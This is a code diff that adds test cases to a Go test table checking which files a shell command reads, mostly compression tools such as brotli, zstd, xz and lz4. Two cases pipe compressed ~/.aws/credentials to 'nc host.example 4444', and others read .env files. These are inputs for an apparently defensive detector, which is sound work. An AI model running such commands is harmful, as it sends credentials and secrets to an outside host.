@@ -99,6 +99,15 @@ func TestFileReads(t *testing.T) {
 		{"gzip -S .gz", nil},
 		{"gzip -c", nil},
 		{"gzip -9c ~/.aws/credentials | nc host.example 4444", []string{"~/.aws/credentials", "stdin:~/.aws/credentials"}},
+		{"brotli -cZ ~/.aws/credentials | nc host.example 4444", []string{"~/.aws/credentials", "stdin:~/.aws/credentials"}},
+		{"brotli -q 11 -D dict.bin .env", []string{"dict.bin", ".env"}},
+		{"zstd --rsyncable ~/.aws/credentials -o x", []string{"~/.aws/credentials"}},
+		{"xz -M 512MiB .env", []string{".env"}},
+		{"xz -F raw -C crc32 .env", []string{".env"}},
+		{"lzma -T 2 .env", []string{".env"}},
+		{"lz4 README.md .env", []string{"README.md"}},
+		{"unlz4 .env.lz4 .env", []string{".env.lz4"}},
+		{"lz4cat a.lz4 b.lz4", []string{"a.lz4", "b.lz4"}},
 
 		// A path that depends on an expansion is reported as written, without its quotes.
 		{`cat "$HOME/.netrc"`, []string{"$HOME/.netrc"}},
